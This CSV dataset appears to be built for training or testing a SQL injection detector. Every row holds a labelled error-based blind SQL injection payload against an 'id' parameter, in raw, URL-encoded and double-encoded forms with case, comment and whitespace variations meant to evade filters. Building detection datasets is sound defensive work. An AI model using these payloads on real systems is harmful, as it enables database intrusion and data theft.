payload,label,attack_type,variant_type,encoding_type,template_id,normalized_hash,payload_hash,length
id=1'%20and%20case%20WheN%20(CHAR(97)='a')%20then%201/0%20Else%201%20END%20--%20-,1,sqli_blind_error,case_var|comment_dash_dash_space|ws_url_space,raw,SQLI_BLIND_ERROR_001,7463baaa9e96d8e7248bbe85951bdc39,455ead987a2ef802bec6699c55a48340,81
id=1'	AND	(SELECT	1/0	FROM	dual	WHERE	LENGTH('test')=4)	--,1,sqli_blind_error,comment_dash_dash|ws_tab,raw,SQLI_BLIND_ERROR_002,85b00adcbb1c1a70199f328770bd5c4f,e4ff182f88f5108f8860c06703e4fa84,58
id%3D1%27+ANd+Case+WhEN+%28CHAR%2897%29%3D%27a%27%29+Then+1%2F0+else+1+END+%2523,1,sqli_blind_error,case_var|comment_url_hash,url_encoded,SQLI_BLIND_ERROR_001,f6a7ac82becbf86a831db13634fdda6d,b7a86350f9bc20e407d37cf841f92b3f,80
id%3D1%27+AND+%28SELECT+1%2F0+FROM+dual+Where+LENGTH%28%27test%27%29%3D4%29+--+-,1,sqli_blind_error,case_var|comment_dash_dash_space,url_encoded,SQLI_BLIND_ERROR_002,5aac55b10213969c29c6d8f40de0d6c5,373db8c470ffbf4f3d9d151566b8d4d6,80
id=1'+And+(SELECT+1/0+FROM+dual+WHERE+100<200)+/*,1,sqli_blind_error,case_var|comment_block_comment|ws_plus,raw,SQLI_BLIND_ERROR_002,c9899c680c76b68f4f8268efd26eb310,4005765956a36911fcc18a88540cfd82,49
"id%3D1%27+AND+IF((LENGTH(%27test')%3D4),+(SELECT+table_name+FROM+information_schema.tables), 0) --+-",1,sqli_blind_error,comment_dash_dash_space,partially_encoded,SQLI_BLIND_ERROR_003,81526ab5bee70d577919eaad3a632ee9,49d35431130a30bae2d5442097ee9383,100
id%3D1%27+AND+%28SELECT+1%2F0+FROM+dual+WHERE+2%3E1%29+--,1,sqli_blind_error,comment_dash_dash|ws_space,url_encoded,SQLI_BLIND_ERROR_002,48109353de8039ed843f5fcc46b9cf1e,b9641633bff5c69a748adf6011b16ef6,57
id%3D1%27+AND+IF%28%281%3D1%29%2C+%28SELECT+table_name+FROM+information_schema.tables%29%2C+0%29+%2F%2A,1,sqli_blind_error,comment_block_comment,url_encoded,SQLI_BLIND_ERROR_003,51531d5c3a2b057a136445a34c2eb2b8,087c826767a6c4902fc68c01bff3c9a7,103
id%253D1%2527%2BAND%2B%2528SELECT%2B1%252F0%2Bfrom%2Bdual%2BWhere%2B1%253D1%2529%2B--%2B-,1,sqli_blind_error,case_var|comment_dash_dash_space|ws_space,double_encoded,SQLI_BLIND_ERROR_002,adf9cc8e4323dc131805449d249704c8,26bc07cc71f0b416942a91c44394f0ef,89
id%253D1%2527%2BANd%2B%2528SELECT%2B1%252F0%2Bfrom%2Bdual%2BWherE%2BCHAR%252897%2529%253D%2527a%2527%2529%2B%252F%252A,1,sqli_blind_error,case_var|comment_block_comment,double_encoded,SQLI_BLIND_ERROR_002,d0fb2aef30151b4e9d31ba8836e13f01,4569e00bf61db00194320a2a2a1be420,118
"id%3D1%27 AND IF(('a'%3D%27a'), (SELECT+table_name from information_schema.tables), 0)+--+-",1,sqli_blind_error,case_var|comment_dash_dash_space,partially_encoded,SQLI_BLIND_ERROR_003,fd74f5f57831c5595c7a4a27796f07ef,1d2f9d562160f7aebeaccf14fefa8583,91
id=1' AND (SELECT 1/0 FROM dual WHERE 7=7) ;-- -,1,sqli_blind_error,comment_semicolon_comment,raw,SQLI_BLIND_ERROR_002,77f27a31e3059c488d19d9feb2bf9534,28769636c072543e2f099cd25b245105,48
id%253D1%2527%252BAND%252BCASE%252BWHEN%252B%2528LENGTH%2528%2527test%2527%2529%253D4%2529%252BTHEN%252B1%252F0%252BELSE%252B1%252BEND%252B%252523,1,sqli_blind_error,comment_url_hash|ws_plus,double_encoded,SQLI_BLIND_ERROR_001,a3890aa7943a12b58bf08d958e32f2df,a6d27122fed29101b1a31fb10e8494c0,146
id%3D1%27%09And%09Case%09WHen%09%281%3D1%29%09then%091%2F0%09ELSe%091%09end%09%2523,1,sqli_blind_error,case_var|comment_url_hash|ws_tab,url_encoded,SQLI_BLIND_ERROR_001,522a18ca2b66195f57ad765e7c055236,7047bc3860560e85599221ce9d0ed016,83
id%3D1%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F1%2F0%2F%2A%2A%2Ffrom%2F%2A%2A%2Fdual%2F%2A%2A%2FWHERE%2F%2A%2A%2FASCII%28%27A%27%29%3D65%29%2F%2A%2A%2F%2523,1,sqli_blind_error,case_var|comment_url_hash|ws_mixed_ws,url_encoded,SQLI_BLIND_ERROR_002,fbd0b91764a2041db44c8985213757a6,e53b755c6ec9f584e7496da8a0a52fff,166
id%253D1%2527%2BAND%2BIF%2528%2528LENGTH%2528%2527test%2527%2529%253D4%2529%252C%2B%2528SELECT%2Btable_name%2Bfrom%2Binformation_schema.tables%2529%252C%2B0%2529%2B--,1,sqli_blind_error,case_var|comment_dash_dash|ws_space,double_encoded,SQLI_BLIND_ERROR_003,fc437b031ce560943c448fbbb15276ea,d478a6d1dfc21cd1eb29e06144eb7d6b,166
id%3D1%27%2520AND%2520%28SELECT%25201%2F0%2520FROM%2520dual%2520WHERE%2520CHAR%2897%29%3D%27a%27%29%2520%3B--%2520-,1,sqli_blind_error,comment_semicolon_comment|ws_url_space,url_encoded,SQLI_BLIND_ERROR_002,3fc57fe4b5b041c17a12fb9fabf5181f,c0972bf7af642e67c25be455c7241c01,115
id%3D1%27%09And%09case%09wHEN%09%281%3D1%29%09theN%091%2F0%09Else%091%09END%09%3B--%09-,1,sqli_blind_error,case_var|comment_semicolon_comment|ws_tab,url_encoded,SQLI_BLIND_ERROR_001,a41f4300eb9c77f3e51507a15b1c75b2,952bf3b16170c080d752e51d0f27ca0a,87
id=1' And (SELECT 1/0 From dual where 1=1) /*,1,sqli_blind_error,case_var|comment_block_comment|ws_space,raw,SQLI_BLIND_ERROR_002,b0a0d3fc3801d3b3377a82ceb74781ce,cd4747c84ecfec329c39c54243c06fe3,45
"id=1'+AND+IF((7=7),+(SELECT+table_name+From+information_schema.tables),+0)+--",1,sqli_blind_error,case_var|comment_dash_dash|ws_plus,raw,SQLI_BLIND_ERROR_003,1bfa76e601c6b6dd60ab58985a10fbc7,6a37fe168b3d6c296df3785ea76e72b6,77
id%3D1%27+AND+%28SELECT+1%2F0+FROM+dual+Where+1%3D1%29+%3B--+-,1,sqli_blind_error,case_var|comment_semicolon_comment,url_encoded,SQLI_BLIND_ERROR_002,9a5168e8d7a9008648b5a864eab5b3d2,443616d35731c15b59b7acd536c422f3,62
id%253D1%2527%2B%2BAND%2B%2BCASE%2B%2BWHEN%2B%2B%2528ASCII%2528%2527A%2527%2529%253D65%2529%2B%2BTHEN%2B%2B1%252F0%2B%2BELSE%2B%2B1%2B%2BEND%2B%2B%252F%252A,1,sqli_blind_error,comment_block_comment|ws_multi_space,double_encoded,SQLI_BLIND_ERROR_001,af6348822a87272cc32a4d2506ccbb3c,b92ddd76bd90349f78c621b4bd174a94,156
id%3D1%27+AND+%28SELECT+1%2F0+FROM+dual+WHERE+1%3D1%29+%23,1,sqli_blind_error,comment_hash|ws_space,url_encoded,SQLI_BLIND_ERROR_002,9270376a25bdfb9851b879845c6c71bc,2cda8a7253a7bfe9d1a561bbbf36cf65,58
id%253D1%2527%252BAND%252BIF%2528%2528CHAR%252897%2529%253D%2527a%2527%2529%252C%252B%2528SELECT%252Btable_name%252BFROM%252Binformation_schema.tables%2529%252C%252B0%2529%252B%252523,1,sqli_blind_error,comment_url_hash|ws_plus,double_encoded,SQLI_BLIND_ERROR_003,03f7741dfad12a0c9667a96ffd87f74d,d53806465382aa13054aa0c331024b5d,183
id%3D1%27+And (SELECT+1%2F0 from+dual where+LENGTH(%27test%27)%3D4)+%2F*,1,sqli_blind_error,case_var|comment_block_comment|ws_space,partially_encoded,SQLI_BLIND_ERROR_002,15c5eb0aa1de95cbda2e0546c5a9b2ac,b005e6215fb87dd909d5fd20a7bd80c9,72
id%253D1%2527%2BAND%2BCASE%2BWHEN%2B%25281%253D1%2529%2BTHEN%2B1%252F0%2BELSE%2B1%2BEND%2B%2523,1,sqli_blind_error,comment_hash,double_encoded,SQLI_BLIND_ERROR_001,4d1ecd908228a5fc5e4a842a4949789a,4a7ebfcdd9140403eccc6009e9038ec3,95
"id%3D1%27 AND+IF((7%3D7), (SELECT+table_name+FROM+information_schema.tables),+0) %23",1,sqli_blind_error,comment_url_hash|ws_space,partially_encoded,SQLI_BLIND_ERROR_003,20efe533cfaf49551dc186112cabadcc,8483640a6a20e8f09e8c124bde163016,84
id%3D1%27++And++case++WHEN++%282%3E1%29++then++1%2F0++Else++1++End++--,1,sqli_blind_error,case_var|comment_dash_dash|ws_multi_space,url_encoded,SQLI_BLIND_ERROR_001,3cce7aaa71d52eaa256c63317a958fc8,3e8ec53be96da9eccad8a18b29c55fb1,70
id%253D1%2527%2BAND%2B%2528SELECT%2B1%252F0%2BFROM%2Bdual%2BWHERE%2B100%253C200%2529%2B--%2B-,1,sqli_blind_error,comment_dash_dash_space,double_encoded,SQLI_BLIND_ERROR_002,844324df6d9d4632d633a2c34f52e9e7,5d676e57f521d798065eaee4663c7d4c,93
id%3D1%27+AND+CASE+WHEN+%28ASCII%28%27A%27%29%3D65%29+THEN+1%2F0+ELSE+1+END+--+-,1,sqli_blind_error,comment_dash_dash_space,url_encoded,SQLI_BLIND_ERROR_001,10371720346b1a1f03fc2155e7b66fc7,1886c735c8c6a40e7940b4c4df607034,80
id%253D1%2527%2BaNd%2B%2528SELECT%2B1%252F0%2BFROM%2Bdual%2Bwhere%2B%2527a%2527%253D%2527a%2527%2529%2B--%2B-,1,sqli_blind_error,case_var|comment_dash_dash_space,double_encoded,SQLI_BLIND_ERROR_002,5aafb4de3e4d785038b6b0805f37ad54,a9febec2ef53fa6c4ac70a2d95a7b61c,109
id%3D1'+AND+(SELECT 1/0 FROM dual+WHERE+100<200)+-- -,1,sqli_blind_error,comment_dash_dash_space,partially_encoded,SQLI_BLIND_ERROR_002,d076b3ba6eb10114b5c8fde8a665991a,a98bea35f39d4087c8f28c02e496c9bc,53
id=1'+and+CaSE+When (1%3D1) THEN 1%2F0 ELSE+1+end+--,1,sqli_blind_error,case_var|comment_dash_dash,partially_encoded,SQLI_BLIND_ERROR_001,98fbf8247bf89dd527f8a6a6b9be8158,a4abd30d146e780d3c36250e9d952206,52
id%3D1%27+AND+IF%28%28ASCII%28%27A%27%29%3D65%29%2C+%28SELECT+table_name+FROM+information_schema.tables%29%2C+0%29+--,1,sqli_blind_error,case_var|comment_dash_dash,url_encoded,SQLI_BLIND_ERROR_003,c93c365e9578c011f58f03386a57ce0b,b19b12750bee4cf28193136f4455012d,117
id%253D1%2527%2Band%2B%2528SELECT%2B1%252F0%2BFrom%2Bdual%2Bwhere%2B2%253E1%2529%2B%253B--%2B-,1,sqli_blind_error,case_var|comment_semicolon_comment,double_encoded,SQLI_BLIND_ERROR_002,5e122a12d9128cb3be594f389916a30c,a2a3171dcdf18eb04827616b4491e3a6,94
id%3D1%27%2520AND%2520%28SELECT%25201%2F0%2520FROM%2520dual%2520WHERE%25202%3E1%29%2520--,1,sqli_blind_error,comment_dash_dash|ws_url_space,url_encoded,SQLI_BLIND_ERROR_002,c7fc37e0391a7f61861523ecbbdd576a,70cdb31c32e011655b5e2f8992911bdd,89
id%253D1%2527%252F%252A%252A%252FAND%252F%252A%252A%252FIF%2528%2528%2527a%2527%253D%2527a%2527%2529%252C%252F%252A%252A%252F%2528SELECT%252F%252A%252A%252Ftable_name%252F%252A%252A%252FFROM%252F%252A%252A%252Finformation_schema.tables%2529%252C%252F%252A%252A%252F0%2529%252F%252A%252A%252F--%252F%252A%252A%252F-,1,sqli_blind_error,comment_dash_dash_space|ws_comment_ws,double_encoded,SQLI_BLIND_ERROR_003,a5041a2b90b484b5bba5d2a08abec893,4341edbaed4e227084272bef37794245,314
id%253D1%2527%2509aND%2509IF%2528%2528CHAR%252897%2529%253D%2527a%2527%2529%252C%2509%2528SELECT%2509table_name%2509from%2509information_schema.tables%2529%252C%25090%2529%2509--%2509-,1,sqli_blind_error,case_var|comment_dash_dash_space|ws_tab,double_encoded,SQLI_BLIND_ERROR_003,f88f79ae1ddb45925c9fc4343f88acfb,3e2585e59af502ac9659101fa3f9935e,184
id=1'%20And%20caSE%20when%20(2>1)%20THEN%201/0%20else%201%20End%20#,1,sqli_blind_error,case_var|comment_hash|ws_url_space,raw,SQLI_BLIND_ERROR_001,3bae70ce7f3577e713c9d2005e551f60,6d2f4c6cd3a7f6062e0397c8bee37b2c,67
id%253D1%2527%2BAND%2BcaSE%2BwHEN%2B%25287%253D7%2529%2BTHEN%2B1%252F0%2BELSE%2B1%2Bend%2B--,1,sqli_blind_error,case_var|comment_dash_dash,double_encoded,SQLI_BLIND_ERROR_001,b64c63cf4af0d103e557901a7f798886,952635117556be59a2402934f6668d3b,92
id%3D1%27+AND+IF%28%28ASCII%28%27A%27%29%3D65%29%2C+%28SELECT+table_name+FROM+information_schema.tables%29%2C+0%29+%2523,1,sqli_blind_error,comment_url_hash,url_encoded,SQLI_BLIND_ERROR_003,4a561d828f39764cf8a62560ef42717f,02c5b05133f91903f6242e8bafca0fa4,120
id%253D1%2527%2BAND%2B%2528SELECT%2B1%252F0%2BFrom%2Bdual%2Bwhere%2BLENGTH%2528%2527test%2527%2529%253D4%2529%2B%252F%252A,1,sqli_blind_error,case_var|comment_block_comment,double_encoded,SQLI_BLIND_ERROR_002,f1f49b751f6aaae40ab6769d29183913,833f00cf0c492511dad90273f6a02314,122
id%253D1%2527%2BAND%2B%2528SELECT%2B1%252F0%2BFROM%2Bdual%2BWHERE%2B1%253D1%2529%2B%253B--%2B-,1,sqli_blind_error,comment_semicolon_comment,double_encoded,SQLI_BLIND_ERROR_002,69070dad53eda1d56a69ceea97d57174,fde3cfec55de46cf274145342e295dd9,94
id%3D1%27%09AND%09case%09WHEN%09%28LENGTH%28%27test%27%29%3D4%29%09THEN%091%2F0%09Else%091%09EnD%09%2523,1,sqli_blind_error,case_var|comment_url_hash|ws_tab,url_encoded,SQLI_BLIND_ERROR_001,149c5a9d9be5dd352f522b4020f15f68,84982176fea1c9359299f240a7a4c40f,104
id=1' and case when (100<200) Then 1/0 ELSE 1 end -- -,1,sqli_blind_error,case_var|comment_dash_dash_space|ws_space,raw,SQLI_BLIND_ERROR_001,30ead5096931b016d18617c96940694a,c73443400b3e85f57a422a810bfb2561,54
id=1' ANd (SELECT 1/0 fROm dual WhEre ASCII('A')=65) %23,1,sqli_blind_error,case_var|comment_url_hash|ws_space,raw,SQLI_BLIND_ERROR_002,223f23908d9713c76fa8870186b64228,e9ef07224fc594ba5188e2d260cd7ea2,56
"id=1%27 AND IF((CHAR(97)%3D%27a'),+(SELECT+table_name FROM information_schema.tables), 0)+--",1,sqli_blind_error,comment_dash_dash,partially_encoded,SQLI_BLIND_ERROR_003,2da7c98e535c72d7539ec07a85596cec,024db9576ef9d71b72acccbbb332cbbf,92
"id=1' AnD IF((1=1), (SELECT table_name FROM information_schema.tables), 0) #",1,sqli_blind_error,case_var|comment_hash,raw,SQLI_BLIND_ERROR_003,50154963d3a48ceb5dd430df5cb15d97,adf5c64166cd90cf594c76f9378bc1bc,76
id%3D1%27+AND+case+When+%28ASCII%28%27A%27%29%3D65%29+THEN+1%2F0+Else+1+END+%2523,1,sqli_blind_error,case_var|comment_url_hash,url_encoded,SQLI_BLIND_ERROR_001,33aa8d5a46dc8f11db7514e80057a62a,5e57da49197df225b663668e03998f1d,81
id%253D1%2527%252520and%252520%2528SELECT%2525201%252F0%252520FROM%252520dual%252520whEre%252520CHAR%252897%2529%253D%2527a%2527%2529%252520%253B--%252520-,1,sqli_blind_error,case_var|comment_semicolon_comment|ws_url_space,double_encoded,SQLI_BLIND_ERROR_002,019617b0f24e09f5b784a07587008e51,ce5825ba34119317656efad0d4aae74c,155
id=1%27+and+CASE+When+(7=7)+Then+1/0+Else+1+enD+/%2A,1,sqli_blind_error,case_var|comment_block_comment|ws_plus,partially_encoded,SQLI_BLIND_ERROR_001,b6bdf844f8356df8db7c68bdf8a4982b,d5b0b4e617973eb885aae3f87e7a0cc3,52
"id=1'	AND	IF((LENGTH('test')=4),	(SELECT	table_name	FROM	information_schema.tables),	0)	;--	-",1,sqli_blind_error,comment_semicolon_comment|ws_tab,raw,SQLI_BLIND_ERROR_003,85de505e2fa14c64d670537a39302521,0dbb080c8c52c2a8fd7ed98a1014cc38,93
id%3D1%27+AND+CASE+WHEN+%28%27a%27%3D%27a%27%29+THEN+1%2F0+ELSE+1+END+%2F%2A,1,sqli_blind_error,comment_block_comment,url_encoded,SQLI_BLIND_ERROR_001,636498771cf2605811f996d1a531d7ce,a8e1120b291a1b9069a244ae410d1025,76
id%3D1%27+AND+%28SELECT+1%2F0+FROM+dual+WHERE+100%3C200%29+--,1,sqli_blind_error,comment_dash_dash,url_encoded,SQLI_BLIND_ERROR_002,a0e351a1bce516d5872e8207d80d4a64,6c9f49d0ea20b4540857c39f2a880e16,61
id%3D1%27+AND+Case wHen+(100<200)+THEN+1%2F0+Else+1+End+%23,1,sqli_blind_error,case_var|comment_hash,partially_encoded,SQLI_BLIND_ERROR_001,376298bc5b0c17b1dcb47fd4937f959d,c3a3b46f7c2b73635987997addee9fba,59
id%253D1%2527%2BAND%2B%2528SELECT%2B1%252F0%2BFROM%2Bdual%2BWHERE%2BASCII%2528%2527A%2527%2529%253D65%2529%2B%252523,1,sqli_blind_error,comment_url_hash,double_encoded,SQLI_BLIND_ERROR_002,c10ed4bbc5f3785e8868ae7420734b95,21532900962ebd0da09eb711148c9a22,116
id%253D1%2527%2B%2BAND%2B%2BCASE%2B%2BWHEN%2B%2B%2528ASCII%2528%2527A%2527%2529%253D65%2529%2B%2BTHEN%2B%2B1%252F0%2B%2BELSE%2B%2B1%2B%2BEND%2B%2B%2523,1,sqli_blind_error,comment_hash|ws_multi_space,double_encoded,SQLI_BLIND_ERROR_001,9fc7dfe9a86e12c3e834220be51f1103,722d565ce19b7417558f3b717b8187f3,151
id%253D1%2527%2BAnd%2Bcase%2BWHEN%2B%25281%253D1%2529%2BtHen%2B1%252F0%2Belse%2B1%2BEND%2B%253B--%2B-,1,sqli_blind_error,case_var|comment_semicolon_comment,double_encoded,SQLI_BLIND_ERROR_001,ce137bf335682e889b5e7306131178e8,f2df3a19ee2bd9013c61c93c61b61c59,101
id=1' And (SELECT 1/0 FRoM dual where 7=7) #,1,sqli_blind_error,case_var|comment_hash,raw,SQLI_BLIND_ERROR_002,38ec1be568d1fc90de35290265f63cac,83dbcf2f69b92f03eaec7174c92e1fe6,44
"id=1'/**/AND/**/IF((1=1),/**/(SELECT/**/table_name/**/FrOM/**/information_schema.tables),/**/0)/**/--/**/-",1,sqli_blind_error,case_var|comment_dash_dash_space|ws_mixed_ws,raw,SQLI_BLIND_ERROR_003,9fd60e9d3ae3d00fdb798e7bd8e76960,fe1e0a09d99341bd29c11c89adcd0dff,106
id=1' and Case WHEN (2>1) THEN 1/0 else 1 END #,1,sqli_blind_error,case_var|comment_hash,raw,SQLI_BLIND_ERROR_001,52d23a514373ae728d991d042223a3c4,9b05ced1dec07ab1644138d026a66ec5,47
id%3D1%27+AND+%28SELECT+1%2F0+from+dual+Where+100%3C200%29+%2523,1,sqli_blind_error,case_var|comment_url_hash,url_encoded,SQLI_BLIND_ERROR_002,b335126242e5a5a7230e4c36e04d718e,d755ee5af4426df015a5d684f4cd917b,64
id=1'	And	(SELECT	1/0	from	dual	Where	7=7)	--,1,sqli_blind_error,case_var|comment_dash_dash|ws_tab,raw,SQLI_BLIND_ERROR_002,93dc57da9f11189049f5970abfa05b43,4fa8cae96499ac7d7254694f5b18a497,45
id%3D1%27+And+%28SELECT+1%2F0+from+dual+WHERE+CHAR%2897%29%3D%27a%27%29+%23,1,sqli_blind_error,case_var|comment_hash,url_encoded,SQLI_BLIND_ERROR_002,63a2a381a2309f4e471f4c52b415d18a,c118ad60839726fdfc3f08cd99cb0813,75
"id=1'/**/AND/**/IF((2>1),/**/(SELECT/**/table_name/**/FROM/**/information_schema.tables),/**/0)/**/#",1,sqli_blind_error,comment_hash|ws_comment_ws,raw,SQLI_BLIND_ERROR_003,5f2744d53a77c1f5c043c54686bac1e5,e46cea193b8e65fee0295513dbe7a58a,100
id=1' AnD (SELECT 1/0 FROM dual WHERE 2>1) ;-- -,1,sqli_blind_error,case_var|comment_semicolon_comment,raw,SQLI_BLIND_ERROR_002,9be304f576c607cbcc8b51c18fca4e37,d44bc81d92e93a47c2d5f01b8806ab9e,48
id%253D1%2527%252F%252A%252A%252FAND%252F%252A%252A%252F%2528SELECT%252F%252A%252A%252F1%252F0%252F%252A%252A%252FFROM%252F%252A%252A%252Fdual%252F%252A%252A%252FWHERE%252F%252A%252A%252F7%253D7%2529%252F%252A%252A%252F%252F%252A,1,sqli_blind_error,comment_block_comment|ws_mixed_ws,double_encoded,SQLI_BLIND_ERROR_002,c5e2a0991a313df394e5324b68b40704,8bc15ab3b46d5689b2ffa857c4f1eccb,229
id%253D1%2527%2BAND%2BIF%2528%2528%2527a%2527%253D%2527a%2527%2529%252C%2B%2528SELECT%2Btable_name%2BFROM%2Binformation_schema.tables%2529%252C%2B0%2529%2B%253B--%2B-,1,sqli_blind_error,comment_semicolon_comment,double_encoded,SQLI_BLIND_ERROR_003,4575ff7a9db35d59a988bd85b3bd3099,04065bfccc3b5b7f8a9883dd47c15460,166
id%3D1%27+and+Case+When+%28%27a%27%3D%27a%27%29+Then+1%2F0+eLSe+1+eND+%2523,1,sqli_blind_error,case_var|comment_url_hash,url_encoded,SQLI_BLIND_ERROR_001,573351d3fe7ea1a3fc114eb8743ecc00,cf092d799e15c188106260c267920af5,75
id%3D1%27%2BAND%2BCASE%2BWHEN%2B%28100%3C200%29%2BTHEN%2B1%2F0%2BELSE%2B1%2BEND%2B%2523,1,sqli_blind_error,comment_url_hash|ws_plus,url_encoded,SQLI_BLIND_ERROR_001,fb05c8a801c8a3146e302a99ab9f8c51,f981e25500aff54227cc9655f49021f8,87
id=1' AND (SELECT 1/0 FROM dual WHERE LENGTH('test')=4) %23,1,sqli_blind_error,comment_url_hash,raw,SQLI_BLIND_ERROR_002,f84d18519209e4d906866a4bd51786a9,6a16b2ca2734853d3f984e02a33725a4,59
id=1' AND (SELECT 1/0 FROM dual WHERE ASCII('A')=65) ;-- -,1,sqli_blind_error,comment_semicolon_comment,raw,SQLI_BLIND_ERROR_002,995d2997f0a0980fab6565f4619a2e50,92f6f23eb94c78c3c102a0f23a2651aa,58
id=1'/**/and/**/(SELECT/**/1/0/**/From/**/dual/**/WHERe/**/CHAR(97)='a')/**/;--/**/-,1,sqli_blind_error,case_var|comment_semicolon_comment|ws_comment_ws,raw,SQLI_BLIND_ERROR_002,5b8ad35f91291b8e7c3e4c299b7cc67a,d6ae7f16d67f9cc46048d9b206f7e93f,84
id%3D1%27/*%2A/AND/%2A*%2F(SELECT/**%2F1/0%2F*%2A%2FFROM%2F*%2A/dual%2F%2A%2A/WHERE%2F%2A*%2F%27a%27%3D%27a%27)%2F%2A*%2F%23,1,sqli_blind_error,comment_hash|ws_comment_ws,partially_encoded,SQLI_BLIND_ERROR_002,3b9b844c20a5a084a82937e92561bd96,27e96dd65c5f8ab228bf7b04ce0b419b,124
id%253D1%2527%252F%252A%252A%252FanD%252F%252A%252A%252FIF%2528%2528100%253C200%2529%252C%252F%252A%252A%252F%2528SELECT%252F%252A%252A%252Ftable_name%252F%252A%252A%252Ffrom%252F%252A%252A%252Finformation_schema.tables%2529%252C%252F%252A%252A%252F0%2529%252F%252A%252A%252F%252F%252A,1,sqli_blind_error,case_var|comment_block_comment|ws_comment_ws,double_encoded,SQLI_BLIND_ERROR_003,462d8da4a607a4b4d22a8c58e18a6c75,7bd408db48987a96f36519aafba2e16d,285
"id=1'%20ANd%20IF((100<200),%20(SELECT%20table_name%20from%20information_schema.tables),%200)%20/*",1,sqli_blind_error,case_var|comment_block_comment|ws_mixed_ws,raw,SQLI_BLIND_ERROR_003,9d7d50d8b5b8ee832f2ee1bd292b772e,398328092df87c26696380133ce76992,97
id%253D1%2527%2B%2BAND%2B%2B%2528SELECT%2B%2B1%252F0%2B%2BFROM%2B%2Bdual%2B%2BWHERE%2B%2BASCII%2528%2527A%2527%2529%253D65%2529%2B%2B%252523,1,sqli_blind_error,comment_url_hash|ws_multi_space,double_encoded,SQLI_BLIND_ERROR_002,4faf16e5523901ebacd530c8c1ca581a,fc28f7a6dafafbdfe69ce95ac03314fc,140
id=1'%20AND%20(SELECT%201/0%20FROM%20dual%20WHERE%20'a'='a')%20--%20-,1,sqli_blind_error,comment_dash_dash_space|ws_url_space,raw,SQLI_BLIND_ERROR_002,4c3bf4390f38d0ace7f765e91bfa5cb7,faadc7fe09c6a4e50c8dc5c63c884f8b,69
"id=1'/**/AND/**/IF((7=7),/**/(SELECT/**/table_name/**/FROM/**/information_schema.tables),/**/0)/**/%23",1,sqli_blind_error,comment_url_hash|ws_comment_ws,raw,SQLI_BLIND_ERROR_003,d20f9188f3ef4f9a83fcc56dbc5bb27f,0c2c5a0d7b695c36680f542dc86da987,102
"id=1'+AND+IF((2>1),+(SELECT+table_name+FROM+information_schema.tables),+0)+/*",1,sqli_blind_error,comment_block_comment|ws_plus,raw,SQLI_BLIND_ERROR_003,632d533f0eaf0df540c2a3d8ac1f574d,18074b708d86f861029d8a49914180d0,77
id%253D1%2527%2Band%2BCASE%2Bwhen%2B%2528100%253C200%2529%2Bthen%2B1%252F0%2Belse%2B1%2BEnd%2B%2523,1,sqli_blind_error,case_var|comment_hash,double_encoded,SQLI_BLIND_ERROR_001,21df36ec8e5e531282996cfd15a88782,0a5aa43dd01fa336aba69fa0d50bc13a,99
id=1' and (SELECT 1/0 from dual WHErE 1=1) --,1,sqli_blind_error,case_var|comment_dash_dash,raw,SQLI_BLIND_ERROR_002,bf57259f4b55079e0469f0c6aaa2c0ee,295b7d089fa6a6be24607168b52faafa,45
"id%3D1%27 AND IF((ASCII('A')%3D65),+(SELECT+table_name+FROM information_schema.tables),+0)+--",1,sqli_blind_error,comment_dash_dash,partially_encoded,SQLI_BLIND_ERROR_003,ff88d2dd936a04d5214151b5267c359f,311421163492f35cd760c0f33a6fd934,93
id%253D1%2527%2Band%2Bcase%2BWHEN%2B%2528CHAR%252897%2529%253D%2527a%2527%2529%2BThen%2B1%252F0%2BElse%2B1%2Bend%2B%252F%252A,1,sqli_blind_error,case_var|comment_block_comment,double_encoded,SQLI_BLIND_ERROR_001,3ed396b6fd3f215453fa0f07eaf6b807,e68598c10694feed1f712e687a2d819d,125
id%253D1%2527%252520and%252520IF%2528%2528LENGTH%2528%2527test%2527%2529%253D4%2529%252C%252520%2528SELECT%252520table_name%252520FROM%252520information_schema.tables%2529%252C%2525200%2529%252520%252523,1,sqli_blind_error,case_var|comment_url_hash|ws_url_space,double_encoded,SQLI_BLIND_ERROR_003,03456ab37bec4e89eff31176a57f647a,30b620728dc9c05b00cc87fb5915df31,203
id=1' and CASe WHEN (ASCII('A')=65) tHeN 1/0 else 1 End /*,1,sqli_blind_error,case_var|comment_block_comment,raw,SQLI_BLIND_ERROR_001,a9d17720fcd242360e304b3fc4d94487,536e9887963c7ea7afa52bb6825c9b03,58
